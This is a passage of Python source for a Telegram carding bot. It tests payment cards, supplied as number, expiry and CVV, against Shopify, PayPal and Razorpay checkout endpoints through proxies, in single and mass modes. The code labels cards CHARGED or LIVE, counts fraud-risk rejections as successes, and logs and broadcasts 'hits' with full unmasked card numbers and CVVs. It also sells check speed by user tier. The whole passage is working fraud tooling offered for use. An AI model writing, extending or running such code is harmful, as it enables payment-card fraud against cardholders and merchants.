                    return await check_card_shopify_single(card, proxy, site_list, site_index + 1, retry_count)
                
                # Determine status based on response
                response_upper = response_text.upper()
                
                # Charged patterns
                charged_patterns = ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED"]
                is_charged = any(pattern in response_upper for pattern in charged_patterns)
                
                # OTP/3D patterns
                otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]
                is_otp = any(pattern in response_upper for pattern in otp_patterns)
                
                # Insufficient funds patterns
                insufficient_patterns = ["INSUFFICIENT", "FUNDS", "INSUFFICIENT_FUNDS"]
                is_insufficient = any(pattern in response_upper for pattern in insufficient_patterns)
                
                # Decline patterns
                decline_patterns = ["DECLINED", "CARD DECLINED", "REJECTED", "DO NOT HONOR"]
                is_declined = any(pattern in response_upper for pattern in decline_patterns)
                
                if is_charged:
                    status_display = "🔥 CHARGED 🔥"
                    status_category = "charged"
                elif is_otp:
                    status_display = "🔐 3D REQUIRED"
                    status_category = "approved"
                elif is_insufficient:
                    status_display = "💰 INSUFFICIENT FUNDS"
                    status_category = "approved"
                elif is_declined:
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                else:
                    # If still SITE DEAD (should have been caught above)
                    if "SITE DEAD" in response_upper:
                        return await check_card_shopify_single(card, proxy, site_list, site_index + 1, retry_count)
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                
                return {
                    "status": "success" if status_category in ["charged", "approved"] else "declined",
                    "result": status_display,
                    "message": response_text,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": "$1.00",  # Always show $1.00 in result
                    "gateway": gateway,
                    "site": site_url,
                    "proxy_used": proxy
                }
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                return {
                    "status": "error",
                    "result": "JSON_ERROR",
                    "message": "Invalid JSON response",
                    "status_display": "⚠️ JSON ERROR",
                    "status_category": "error",
                    "elapsed": elapsed,
                    "price": "$1.00"
                }
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            return {
                "status": "error",
                "result": f"HTTP_{response.status_code}",
                "message": f"HTTP Error: {response.status_code}",
                "status_display": f"⚠️ HTTP {response.status_code}",
                "status_category": "error",
                "elapsed": elapsed,
                "price": "$1.00"
            }
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error on site {site_url}")
        await asyncio.sleep(1)
        return await check_card_shopify_single(card, proxy, site_list, site_index + 1, retry_count)
    except Exception as e:
        print(f"❌ Error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "price": "$1.00"
        }


def format_shopify_single_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Shopify Single gateway response for display - ALWAYS SHOW $1.00"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    price = "$1.00"  # Always $1.00 for display
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", SH_GATEWAY_GATEWAY)
    proxy_used = result.get("proxy_used", "None")
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category


async def single_check_shopify_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with PayPal API - formatted exactly like Shopify response"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Shopify Payments Single Check</b>\n\n"
            "Usage: <code>/sh &lt;card&gt;</code>\n"
            f"💰 Amount: $1.00\n"
            f"🌐 Gateway: Shopify Payments",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4111111111111111|12|2025|123"
        )
        return
    
    # Mark user as active
    shopify_active_tasks[user_id] = True
    
    checking_msg = None
    
    try:
        # Check user access (use paypal gateway for backend)
        if not user_manager.can_access_gateway(user_id, 'paypal'):
            await message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return
        
        # Send checking animation
        checking_msg = await send_checking_animation(update, context, sticker=True)
        
        if checking_msg:
            await asyncio.sleep(0.5)
        
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get amount from user settings
        amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
        currency = context.user_data.get('payment_currency', DEFAULT_CURRENCY)
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(user_id):
            proxy_str = get_proxy_for_user(user_id, 'paypal')
        
        # Use PayPal API
        result = await check_card_paypal(card, amount, currency, proxy_str, user_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        bin_info_text, bank, country, currency_code, country_code = bin_info
        
        # Format response exactly as requested
        if result:
            response_text = result.get("message", "UNKNOWN")
            status_category = result.get("status_category", "unknown")
            result_status = result.get("result", "")
            result_code = result.get("code", "")
            
            response_upper = response_text.upper()
            code_upper = result_code.upper()
            
            # ============ UPDATED: CHARGED patterns (including risk responses) ============
            # These indicate the card is valid/working and should show as CHARGED
            charged_patterns = [
                "CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED",
                "RISK_DISALLOWED", "RISK", "DISALLOWED", 
                 "EXISTING_ACCOUNT_RESTRICTED"
            ]
            
            # 3D/OTP patterns
            otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]
            
            # Check if it's a CHARGED response (including risk responses)
            is_charged = any(p in response_upper for p in charged_patterns) or any(p in code_upper for p in charged_patterns)
            
            # Check if it's OTP required
            is_otp = any(p in response_upper for p in otp_patterns)
            
            if is_charged:
                status_display = "🔥 CHARGED 🔥"
                status_category_final = "charged"
                response_msg = "Order completed 💎"
            elif is_otp:
                status_display = "🔐 3D REQUIRED"
                status_category_final = "approved"
                response_msg = "OTP_REQUIRED"
            elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                status_display = "💰 INSUFFICIENT FUNDS"
                status_category_final = "approved"
                response_msg = "INSUFFICIENT FUNDS"
            else:
                status_display = "❌ DECLINED"
                status_category_final = "declined"
                response_msg = "CARD DECLINED"
            
            # Format price
            try:
                price_float = float(amount)
                price_str = f"${price_float:.2f}"
            except:
                price_str = f"${amount}"
            
            # Build exact format
            ui = (
                f"┏━━━━━━━⍟\n"
                f"┃ {status_display}\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
                f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
        else:
            ui = (
                f"┏━━━━━━━⍟\n"
                f"┃ ❌ DECLINED\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ GENERIC_ERROR\n"
                f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ $1.00\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"[⌬] 𝐁𝐈𝐍 ↣ N/A\n"
                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ N/A\n"
                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ 🌐 N/A\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            status_category_final = "error"
        
        # Delete the checking animation
        if checking_msg:
            try:
                await checking_msg.delete()
            except:
                pass
        
        # Send result
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved or charged
        if status_category_final in ["charged", "approved"]:
            user_data = user_manager.get_user(user_id)
            await send_hit_notification(
                context=context,
                gateway="Shopify Payments",
                card=card,
                response=response_msg,
                price=price_str,
                user=user_data,
                bin_info=bin_info,
                status_category=status_category_final
            )
            
            await save_hit_to_file(
                card=card,
                gateway="Shopify Payments",
                response=response_msg,
                price=price_str,
                bin_info=bin_info,
                user_id=user_id,
                user_tier=tier
            )
            
            user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
    except Exception as e:
        if checking_msg:
            try:
                await checking_msg.delete()
            except:
                pass
        
        # Send error in same format
        error_ui = (
            f"┏━━━━━━━⍟\n"
            f"┃ ❌ DECLINED\n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
            f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
            f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ GENERIC_ERROR\n"
            f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ $1.00\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[⌬] 𝐁𝐈𝐍 ↣ N/A\n"
            f"[⌬] 𝐁𝐚𝐧𝐤 ↣ N/A\n"
            f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ 🌐 N/A\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        await message.reply_text(error_ui, parse_mode=ParseMode.HTML)
        print(f"❌ [Shopify Single] Error: {traceback.format_exc()}")
    finally:
        shopify_active_tasks.pop(user_id, None)
# ============ CHECKING STICKERS ============
# Pool of sticker file IDs to show while checking
CHECKING_STICKERS = [
    "CAACAgUAAxkBAvJWH2m-iUgj9vZhdqUeAAHBJTx8s4YUuAACsg8AAoPv8Vc5M9aFNoaCRToE",  # Pikachu animated sticker
]

# Fallback emoji animation if stickers fail
ANIMATION_FRAMES = ["🔄", "⚙️", "🔧", "💳", "💸", "💰", "✨"]

async def send_checking_animation(update: Update, context: ContextTypes.DEFAULT_TYPE, sticker: bool = True):
    """
    Send a checking animation (sticker or emoji animation)
    Returns the message object to delete later
    """
    if sticker and CHECKING_STICKERS:
        # Filter out None values
        valid_stickers = [s for s in CHECKING_STICKERS if s and s.strip()]
        if valid_stickers:
            try:
                # Send random sticker from pool
                sticker_id = random.choice(valid_stickers)
                print(f"🎨 Sending sticker: {sticker_id}")
                
                msg = await context.bot.send_sticker(
                    chat_id=update.effective_chat.id,
                    sticker=sticker_id
                )
                print(f"✅ Sticker sent successfully! Message ID: {msg.message_id}")
                return msg
            except Exception as e:
                print(f"⚠️ Sticker send failed: {e}")
                # Fallback to emoji animation
                return await send_emoji_animation(update, context)
        else:
            print("⚠️ No valid sticker IDs found, using emoji animation")
            return await send_emoji_animation(update, context)
    else:
        return await send_emoji_animation(update, context)

async def send_emoji_animation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Send an emoji-based animation (fallback when stickers fail)
    """
    msg = await update.message.reply_text(
        "🔄 Processing...",
        parse_mode=ParseMode.HTML
    )
    return msg


# ============ ADD THIS COMMAND TO GET GIF FILE ID ============
async def get_gif_id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get file_id of a sent GIF (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only.")
        return
    
    if update.message.reply_to_message and update.message.reply_to_message.animation:
        gif = update.message.reply_to_message.animation
        file_id = gif.file_id
        await update.message.reply_text(
            f"🎬 <b>GIF File ID:</b>\n\n<code>{file_id}</code>\n\n"
            f"Copy this to HIT_GIF_FILE_ID in your code.",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text("Reply to a GIF message to get its file_id.")
        
        
# ============ STYLISH CARD RESULT FORMATTER (LIKE THE IMAGE) ============
def format_hit_result_for_gif_full_card(
    card: str,
    gateway: str,
    response: str,
    price: str,
    bin_info: tuple,
    username: str = None
) -> str:
    """
    Format card result with FULL CARD (no masking) - exactly as requested
    """
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    # Parse card parts
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # ============ SHOW FULL CARD NUMBER (NO MASKING) ============
    card_display = card_num  # Full card number
    
    # Determine status based on response
    response_upper = response.upper()
    
    if "CHARGED" in response_upper or "ORDER COMPLETED" in response_upper or "PAID" in response_upper:
        status_display = "CHARGED"
        status_emoji = "🔥"
    elif "INSUFFICIENT" in response_upper:
        status_display = "INSUFFICIENT FUNDS"
        status_emoji = "💰"
    elif "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
        status_display = "CVV LIVE"
        status_emoji = "✅"
    elif "3D" in response_upper or "OTP" in response_upper:
        status_display = "3D REQUIRED"
        status_emoji = "🔐"
    else:
        status_display = "LIVE"
        status_emoji = "💳"
    
    # Extract brand from BIN info
    brand = bin_info_text.split(' - ')[0] if ' - ' in bin_info_text else bin_info_text
    if len(brand) > 15:
        brand = brand[:15]
    
    # Format bank name
    bank_display = bank if bank != 'N/A' else "Unknown"
    if len(bank_display) > 25:
        bank_display = bank_display[:22] + "..."
    
    # Format country with flag emoji
    country_name = country.replace('🌐', '').strip()
    country_flag = "🌍"
    
    # Simple flag mapping
    flag_map = {
        'PHILIPPINES': '🇵🇭', 'USA': '🇺🇸', 'UNITED STATES': '🇺🇸',
        'UK': '🇬🇧', 'UNITED KINGDOM': '🇬🇧', 'CANADA': '🇨🇦',
        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
    }
    for key, flag in flag_map.items():
        if key in country_name.upper():
            country_flag = flag
            break
    
    # Format price
    try:
        price_float = float(price.replace('$', ''))
        price_display = f"${price_float:.2f}"
    except:
        price_display = price
    
    # Get current time
    current_time = datetime.now().strftime('%H:%M')
    
    # Use provided username or default
    user_display = username or "User"
    
    # ============ EXACT FORMAT - WITH FULL CARD ============
    result = (
        f"<b>Status</b> → {status_emoji} {status_display}\n"
        f"<b>Card</b> → <code>{card_display}</code> | {exp_month} | {exp_year} | {cvv}\n"
        f"<b>Gateway</b> → {gateway} {price_display}\n"
        f"<b>Response</b> → {response[:80]}\n"
        f"<b>Brand</b> → {brand}\n"
        f"<b>Issuer</b> → {bank_display}\n"
        f"<b>Country</b> → {country_flag} {country_name}\n"
        f"<b>User</b> → {user_display}\n"
        f"<b>Dev</b> → @Cypher099 \n"
        f"⏱️ {current_time}"
    )
    
    return result


# ============ FUNCTION TO SEND GIF + RESULT TO USER ============
async def send_gif_with_result(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    card: str,
    gateway: str,
    response: str,
    price: str,
    bin_info: tuple,
    status_category: str,
    username: str = None
):
    """
    Send random LOCAL GIF file WITH the result text as CAPTION
    Rotates through multiple GIFs randomly
    """
    message = update.effective_message
    
    # Format the result text
    result_text = format_hit_result_for_gif_full_card(
        card, gateway, response, price, bin_info, username
    )
    
    if status_category != "charged":
        await message.reply_text(result_text, parse_mode=ParseMode.HTML)
        return
    
    # Get random GIF path
    gif_path = get_random_gif_path(gateway)
    
    if not gif_path or not Path(gif_path).exists():
        print(f"⚠️ No valid GIF found, sending text only")
        await message.reply_text(result_text, parse_mode=ParseMode.HTML)
        return
    
    print(f"🎲 Selected random GIF: {gif_path}")
    
    # Send combined GIF + caption
    try:
        with open(gif_path, 'rb') as media_file:
            # Try as animation (GIF) with caption
            await message.reply_animation(
                animation=media_file,
                caption=result_text,
                parse_mode=ParseMode.HTML
            )
            print(f"✅ Random GIF sent with caption!")
            return
    except Exception as e:
        print(f"⚠️ Animation failed: {e}")
        
        try:
            with open(gif_path, 'rb') as media_file:
                # Try as video with caption
                await message.reply_video(
                    video=media_file,
                    caption=result_text,
                    parse_mode=ParseMode.HTML
                )
            print(f"✅ Random video sent with caption!")
            return
        except Exception as e2:
            print(f"⚠️ Video failed: {e2}")
            # Last resort: send text only
            await message.reply_text(result_text, parse_mode=ParseMode.HTML)
# ============ RAZORPAY GATEWAY FUNCTIONS ============

async def check_razorpay_api(card: str, site: str, amount: int, proxy: str = None) -> Dict:
    import urllib.parse
    encoded_card = urllib.parse.quote(card)
    encoded_site = urllib.parse.quote(site)
    api_url = f"{RAZORPAY_API_BASE}?cc={encoded_card}&site={encoded_site}&amount={amount}"
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            response = await client.get(api_url)
            if response.status_code == 200:
                data = response.json()
                return {"success": True, "api_response": data, "site": site, "amount": amount}
            else:
                return {"success": False, "error": f"HTTP {response.status_code}", "response_text": response.text[:200]}
    except Exception as e:
        return {"success": False, "error": str(e)[:100]}

def format_razorpay_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Razorpay response for display"""
    if not result.get("success"):
        error_msg = result.get('error', 'Unknown error')
        return f"❌ Error: {error_msg}", "error"
    
    api_response = result.get("api_response", {})
    bin_info_text, bank, country, currency_code, country_code = bin_info
    status = api_response.get("status", "unknown")
    message = api_response.get("message", "No message")
    reason = api_response.get("reason", "")
    payment_id = api_response.get("payment_id", "")
    amount = api_response.get("amount", result.get("amount", "N/A"))
    response_time = api_response.get("time", result.get("elapsed", 0))
    
    status_category = "unknown"
    status_emoji = "❓"
    status_text = "UNKNOWN"
    
    if status == "success":
        status_category = "live"
        status_emoji = "✅"
        status_text = "LIVE"
    elif status == "declined":
        if reason and "risk" in reason.lower():
            status_category = "risk"
            status_emoji = "⚠️"
            status_text = "RISK FAILED"
        elif reason and "insufficient" in reason.lower():
            status_category = "live"
            status_emoji = "💰"
            status_text = "INSUFFICIENT FUNDS"
        else:
            status_category = "dead"
            status_emoji = "❌"
            status_text = "DECLINED"
    elif status == "error":
        status_category = "error"
        status_emoji = "⚠️"
        status_text = "ERROR"
    
    status_display = f"{status_emoji} {status_text}"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Razorpay\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ ₹{amount}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
    )
    if reason:
        ui += f"[⌬] 𝐑𝐞𝐚𝐬𝐨𝐧 ↣ {reason}\n"
    if payment_id:
        ui += f"[⌬] 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐈𝐃 ↣ {payment_id}\n"
    ui += (
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {response_time:.2f}s"
    )
    return ui, status_category

async def razorpay_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    # REMOVED global semaphore acquisition
    # if not await user_semaphore.acquire():
    #     await message.reply_text("⚠️ Bot is busy with many users. Please try again in a moment.")
    #     return
    
    try:
        razorpay_active_tasks[u_id] = True
        
        live_count, dead_count, error_count = 0, 0, 0
        total = len(cards)
        site = context.user_data.get('razorpay_site')
        if not site:
            await message.reply_text("❌ <b>Site parameter required for Razorpay</b>\n\nPlease provide a site/merchant identifier first.", parse_mode=ParseMode.HTML)
            return
        amount_inr = context.user_data.get('razorpay_amount', 10)
        start_time_session = time.time()
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        await message.reply_text(
            f"🔄 <b>Razorpay Batch Started</b>\n\n"
            f"📍 Site: {site}\n"
            f"📝 Cards: {total}\n"
            f"💰 Amount: ₹{amount_inr}\n"
            f"⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour ({TIER_CONCURRENCY.get(tier, 1)} parallel)\n"
            f"👥 Other users can still use the bot",
            parse_mode=ParseMode.HTML,
            reply_markup=stop_markup(u_id)
        )
        
        semaphore = asyncio.Semaphore(TIER_CONCURRENCY.get(tier, 1))
        
        async def check_with_control(card):
            async with semaphore:
                await speed_controller.wait_if_needed()
                
                start = time.time()
                proxy = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
                result = await check_razorpay_api(card, site, amount_inr, proxy)
                elapsed = time.time() - start
                
                speed_controller.record_response(elapsed)
                
                return result, card, elapsed
        
        chunk_size = min(10, TIER_CONCURRENCY.get(tier, 1))
        for i in range(0, len(cards), chunk_size):
            if u_id not in razorpay_active_tasks:
                await message.reply_text("🛑 <b>Session stopped</b>", parse_mode=ParseMode.HTML)
                break
            
            chunk = cards[i:i+chunk_size]
            tasks = [check_with_control(card) for card in chunk]
            
            try:
                chunk_results = await asyncio.wait_for(
                    asyncio.gather(*tasks),
                    timeout=180
                )
            except asyncio.TimeoutError:
                await message.reply_text("⚠️ Chunk processing timeout, continuing...")
                continue
            
            for idx, (result, card, elapsed) in enumerate(chunk_results, i+1):
                if u_id not in razorpay_active_tasks:
                    break
                    
                bin_info = await get_bin_info(card)
                ui, status_category = format_razorpay_response(result, card, bin_info)
                
                if status_category == "live":
                    user_data = user_manager.get_user(u_id)
                    await send_hit_notification(
                        context=context,
                        gateway="Razorpay",
                        card=card,
                        response=result.get("api_response", {}).get("message", "LIVE"),
                        price=f"₹{amount_inr}",
                        user=user_data,
                        bin_info=bin_info,
                        status_category="approved"
                    )
                    
                    await save_hit_to_file(
                        card=card,
                        gateway="Razorpay",
                        response=result.get("api_response", {}).get("message", "LIVE"),
                        price=f"₹{amount_inr}",
                        bin_info=bin_info,
                        user_id=u_id,
                        user_tier=tier
                    )
                    
                    live_count += 1
                    stats = speed_controller.get_stats()
                    progress = int((idx/total)*10)
                    bar = "▓" * progress + "░" * (10 - progress)
                    
                    
                    try:
                        await asyncio.wait_for(
                            message.reply_text(ui, parse_mode=ParseMode.HTML),
                            timeout=10
                        )
                    except asyncio.TimeoutError:
                        pass
                        
                else:
                    if status_category == "dead":
                        dead_count += 1
                    else:
                        error_count += 1
                
                await asyncio.sleep(0.001)
        
        if u_id in razorpay_active_tasks:
            total_time = time.time() - start_time_session
            stats = speed_controller.get_stats()
            summary = f"🏁 <b>Razorpay Session Finished</b>\n\n🟢 Live: {live_count}\n🔴 Dead: {dead_count}\n⚠️ Errors: {error_count}\n📝 Total: {total}\n⚡ Speed: {stats['current_cph']:.0f}/{stats['target_cph']} cph\n⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s"
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"[ERROR] {traceback.format_exc()}")
    finally:
        razorpay_active_tasks.pop(u_id, None)
        # REMOVED global semaphore release
        # user_semaphore.release()
        
async def single_check_razorpay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Razorpay gateway - /rzc <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💰 <b>Razorpay Single Check</b>\n\n"
            "Usage: <code>/rzc &lt;card&gt;</code>\n"
            "Example: <code>/rzc 4111111111111111|12|2025|123</code>\n\n"
            "First, configure your Razorpay settings:\n"
            "• /rz_site &lt;site&gt; - Set merchant site\n"
            "• /rz_amount &lt;amount&gt; - Set amount in INR\n\n"
            "📍 Gateway: Razorpay via API",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    card_text = " ".join(context.args).strip()
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'razorpay'):
        await update.message.reply_text("❌ Your tier doesn't have access to Razorpay gateway.")
        return
    
    # Check if site is configured
    site = context.user_data.get('razorpay_site')
    if not site:
        await update.message.reply_text(
            "❌ <b>Site parameter required for Razorpay</b>\n\n"
            "Please set a site first using:\n"
            "<code>/rz_site &lt;site&gt;</code>\n\n"
            "Example: <code>/rz_site https://pages.razorpay.com/iicdelhi</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await update.message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4111111111111111|12|2025|123"
        )
        return
    
    # Call the single check logic
    await razorpay_single_check_logic(update, context, card)

async def razorpay_single_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Single check logic for Razorpay gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    
    try:
        # Check user access
        allowed, error_msg = await check_user_access(update, context, "razorpay")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        # Get site and amount from user data
        site = context.user_data.get('razorpay_site')
        if not site:
            await message.reply_text(
                "❌ <b>Site parameter required for Razorpay</b>\n\n"
                "Please set a site using:\n"
                "<code>/rz_site &lt;site&gt;</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        amount_inr = context.user_data.get('razorpay_amount', 10)
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        status_msg = await message.reply_text(f"🔄 Checking card with Razorpay (₹{amount_inr})...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        
        # Make API call
        result = await check_razorpay_api(card, site, amount_inr, proxy)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        
        # Format response
        ui, status_category = format_razorpay_response(result, card, bin_info)
        
        # Send result
        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if live
        if status_category == "live":
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="Razorpay",
                card=card,
                response=result.get("api_response", {}).get("message", "LIVE"),
                price=f"₹{amount_inr}",
                user=user_data,
                bin_info=bin_info,
                status_category="approved"
            )
            
            await save_hit_to_file(
                card=card,
                gateway="Razorpay",
                response=result.get("api_response", {}).get("message", "LIVE"),
                price=f"₹{amount_inr}",
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_manager.increment_hits(u_id)
        
        user_manager.increment_checks(u_id)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Razorpay Single] Error: {traceback.format_exc()}")
        
async def rz_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set Razorpay site/merchant identifier - /rz_site <site>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        current = context.user_data.get('razorpay_site', 'Not set')
        await update.message.reply_text(
            f"🌐 <b>Razorpay Site Settings</b>\n\n"
            f"Current site: <code>{current}</code>\n\n"
            f"Usage: <code>/rz_site &lt;site&gt;</code>\n"
            f"Example: <code>/rz_site https://pages.razorpay.com/iicdelhi</code>\n\n"
            f"<i>This site will be used for all Razorpay checks</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    site = " ".join(context.args).strip()
    context.user_data['razorpay_site'] = site
    
    await update.message.reply_text(
        f"✅ <b>Razorpay site set to:</b> <code>{site}</code>\n\n"
        f"Now you can use <code>/rzc &lt;card&gt;</code> for single checks\n"
